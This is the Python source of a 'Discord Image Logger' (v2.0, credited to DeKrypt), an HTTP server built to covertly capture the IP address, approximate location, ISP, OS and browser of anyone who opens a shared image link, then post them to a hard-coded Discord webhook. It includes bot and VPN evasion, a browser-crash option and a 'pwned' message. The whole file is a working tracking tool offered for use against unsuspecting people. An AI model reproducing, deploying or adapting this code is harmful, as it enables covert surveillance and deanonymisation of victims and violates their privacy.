from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback
import requests
import base64
import httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to log IP addresses by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discordapp.com/api/webhooks/1251225809595928738/baEQyV0CeLbBCSXgpgZbT_vJjNh13wKJRhhT_VK4PJTpONNqT0Lk82F_sfQH82e_60_X",
    "image": "https://zapodaj.net/images/8ac87317bfd76.jpg",  # Default image URL
    "imageArgument": True,  # Allows using a URL argument to change the image

    # CUSTOMIZATION #
    "username": "Image Logger",  # Webhook username
    "color": 0x00FFFF,  # Embed color (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False,  # Attempts to crash/freeze the user's browser
    "accurateLocation": False,  # Uses GPS for accurate location (disabled due to user prompt)
    "message": {  # Custom message when the image is opened
        "doMessage": False,  # Enable custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",  # Message content
        "richMessage": True,  # Use rich text?
    },
    "vpnCheck": 1,  # VPN detection level
    "linkAlerts": True,  # Alert when the link is sent multiple times
    "buggedImage": True,  # Shows loading image as preview in Discord
    "antiBot": 1,  # Bot detection level

    # REDIRECTION #
    "redirect": {
        "redirect": False,  # Redirect enabled?
        "page": ""  # Redirect page URL
    }
}

blacklistedIPs = ("27", "104", "143", "164")  # Blacklisted IP prefixes

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while logging an IP!\n\n**Error:**\n```\n{error}\n```",
            }
        ],
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)

    if bot:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "",
            "embeds": [
                {
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }
            ],
        }) if config["linkAlerts"] else None
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
            return

        if config["vpnCheck"] == 1:
            ping = ""

    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
            return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent)

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat']) + ', ' + str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](' + 'https://www.google.com/maps/search/google+map++' + coords + ')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:** `{useragent}`
                """
            }
        ],
    }

    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})

    requests.post(config["webhook"], json=embed)
    return info

class ImageLoggerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            url_params = parse.parse_qs(parse.urlparse(self.path).query)
            ip = self.client_address[0]
            useragent = self.headers.get('User-Agent')
            image = config["image"]

            # Check if there's a URL argument to override the image
            if config["imageArgument"] and "url" in url_params:
                image = url_params["url"][0]

            # Simulate crashing the browser (if enabled)
            if config["crashBrowser"]:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"Crash the browser here...")
                return

            # Send a custom message (if enabled)
            if config["message"]["doMessage"]:
                message = config["message"]["message"]
                if config["message"]["richMessage"]:
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(f"<html><body><h1>{message}</h1></body></html>".encode('utf-8'))
                else:
                    self.send_response(200)
                    self.send_header('Content-type', 'text/plain')
                    self.end_headers()
                    self.wfile.write(message.encode('utf-8'))
                return

            # Redirect to another page (if enabled)
            if config["redirect"]["redirect"]:
                self.send_response(301)
                self.send_header('Location', config["redirect"]["page"])
                self.end_headers()
                return

            # Handle image logging
            if image in self.path:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(requests.get(image).content)

                if "ip" in url_params and "endpoint" in url_params:
                    coords = url_params["ip"][0]
                    endpoint = url_params["endpoint"][0]
                    makeReport(ip, useragent, coords, endpoint, image)

                return

            # Default response if image logging path not matched
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'404 - Not Found')

        except Exception as e:
            error_message = f"Error occurred: {str(e)}\n\n{traceback.format_exc()}"
            print(error_message)
            reportError(error_message)

            self.send_response(500)
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')

if __name__ == "__main__":
    host = 'localhost'
    port = 8000  # Zmieniony port na 8000
    server = HTTPServer((host, port), ImageLoggerHandler)
    print(f'Started {__app__} server at http://{host}:{port}')
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    server.server_close()
    print(f'Stopped {__app__} server')
